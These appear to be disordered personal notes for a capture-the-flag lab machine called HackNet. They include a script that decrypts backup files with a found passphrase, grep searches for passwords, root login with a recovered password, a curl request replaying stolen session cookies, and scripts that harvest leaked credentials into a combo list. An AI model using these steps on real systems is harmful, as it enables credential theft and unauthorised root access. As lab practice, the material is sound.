head /tmp/test.sql
```


HERE is after the sweetheart in sandy machine***  

```
cat << EOF > lotus.sh
#!/bin/bash
# Bulk decrypt HackNet backup files

# Configuration
KEY_PATH="\$HOME/.gnupg/private-keys-v1.d/armored_key.asc"
BACKUP_DIR="/var/www/HackNet/backups"
OUTPUT_DIR="/tmp"
PASSPHRASE="sweetheart"   # Leave empty if no passphrase is required

# Import private key
gpg --import "\$KEY_PATH"

# Bulk decrypt all backup files
for file in "\$BACKUP_DIR"/*.gpg; do
    filename=\$(basename "\$file" .gpg)
    outpath="\$OUTPUT_DIR/\$filename.sql"
    echo "[*] Decrypting \$file → \$outpath"

    if [ -n "\$PASSPHRASE" ]; then
        gpg --batch --yes \\
            --passphrase "\$PASSPHRASE" \\
            --pinentry-mode loopback \\
            -o "\$outpath" -d "\$file"
    else
        gpg --batch --yes \\
            -o "\$outpath" -d "\$file"
    fi
done

echo "[*] Done. Decrypted files are in \$OUTPUT_DIR"
EOF

```

then 

```
chmod +x lotus.sh
./lotus.sh
```

then 

```
grep -i "password" /tmp/*.sql.sql
grep -i "root" /tmp/*.sql.sql
grep -i "admin" /tmp/*.sql.sql
grep -i "ssh" /tmp/*.sql.sql
grep -i "user" /tmp/*.sql.sql
```

the password is in here: `h4ck3rs4re3veRywh3re99`

<img width="1351" height="367" alt="image" src="https://github.com/user-attachments/assets/5de56cfd-9088-464f-a1a6-2e7ef1ecfacb" />

```
su root
Password: h4ck3rs4re3veRywh3re99
whoami
root
ls
lotus.sh
systemd-private-dcac3180b37749678512fd74c3fc09b0-systemd-logind.service-qAL71G
vmware-root_556-2966037836
cd /root 
cat root.txt
fba299c5a099e960eecf86114b82fecf
```


---------------------







```
nano lotus.sh

#!/bin/bash
# Bulk decrypt HackNet backup files

# Configuration
KEY_PATH="$HOME/.gnupg/private-keys-v1.d/armored_key.asc"
BACKUP_DIR="/var/www/HackNet/backups"
OUTPUT_DIR="/tmp"
PASSPHRASE="sweetheart"   # Leave empty if no passphrase is required

# Import private key
gpg --import "$KEY_PATH"

# Bulk decrypt all backup files
for file in "$BACKUP_DIR"/*.gpg; do
    filename=$(basename "$file" .gpg)
    outpath="$OUTPUT_DIR/$filename.sql"
    echo "[*] Decrypting $file → $outpath"

    if [ -n "$PASSPHRASE" ]; then
        gpg --batch --yes \
            --passphrase "$PASSPHRASE" \
            --pinentry-mode loopback \
            -o "$outpath" -d "$file"
    else
        gpg --batch --yes \
            -o "$outpath" -d "$file"
    fi
done

echo "[*] Done. Decrypted files are in $OUTPUT_DIR"
```

```
┌──(ClearLotus㉿kali)-[~/Hacknet]
└─$ sudo chmod +x lotus.sh 

┌──(ClearLotus㉿kali)-[~/Hacknet]
└─$ ./lotus.sh
gpg: directory '/home/ClearLotus/.gnupg' created
gpg: keybox '/home/ClearLotus/.gnupg/pubring.kbx' created
gpg: can't open '/home/ClearLotus/.gnupg/private-keys-v1.d/armored_key.asc': No such file or directory
gpg: Total number processed: 0
[*] Decrypting /var/www/HackNet/backups/*.gpg → /tmp/*.sql
gpg: can't open '/var/www/HackNet/backups/*.gpg': No such file or directory
gpg: decrypt_message failed: No such file or directory
[*] Done. Decrypted files are in /tmp

```










NEW

curl -b "sessionid=hzuvjy1fljqkup6ek8rldob27wnf4ud8; csrftoken=Ysga4uQHmPV2krnl9NaesTZhr2fYtUvo" http://hacknet.htb/explore






Not here: 


```
nano leak.html

<copy of above image>
```

```
grep -oP "'username': '\K[^']+" leak.html > users.txt
grep -oP "'password': '\K[^']+" leak.html > passwords.txt
paste users.txt passwords.txt
```

XXX

```
nano extract.py

import re
import html

# Step 1: Read and decode HTML entities
with open("leak.html", "r", encoding="utf-8") as f:
    raw = f.read()
    data = html.unescape(raw)

# Step 2: Extract credentials using regex
users = re.findall(r"'username': '([^']+)'", data)
passwords = re.findall(r"'password': '([^']+)'", data)
emails = re.findall(r"'email': '([^']+)'", data)

# Step 3: Display them
print("[+] Extracted credentials:\n")
for u, p, e in zip(users, passwords, emails):
    print(f"{u:15} | {p:20} | {e}")
```

```
python3 extract.py
[+] Extracted credentials:

cyberghost      | Gh0stH@cker2024      | cyberghost@darkmail.net
shadowcaster    | Sh@d0wC@st!          | shadowcaster@darkmail.net
glitch          | Gl1tchH@ckz          | glitch@cypherx.com
netninja        | N3tN1nj@2024         | netninja@hushmail.com
exploit_wizard  | Expl01tW!zard        | exploit_wizard@hushmail.com
whitehat        | Wh!t3H@t2024         | whitehat@darkmail.net
deepdive        | D33pD!v3r            | deepdive@hacknet.htb
virus_viper     | V!rusV!p3r2024       | virus_viper@securemail.org
brute_force     | BrUt3F0rc3#          | brute_force@ciphermail.com
{{ users.values }} | lotus                | lotus@clear.com

```

```
sudo nano combos.txt

cyberghost:Gh0stH@cker2024
shadowcaster:Sh@d0wC@st!
glitch:Gl1tchH@ckz
netninja:N3tN1nj@2024
exploit_wizard:Expl01tW!zard
whitehat:Wh!t3H@t2024
deepdive:D33pD!v3r
virus_viper:V!rusV!p3r2024
brute_force:BrUt3F0rc3#
lotus:lotus


```















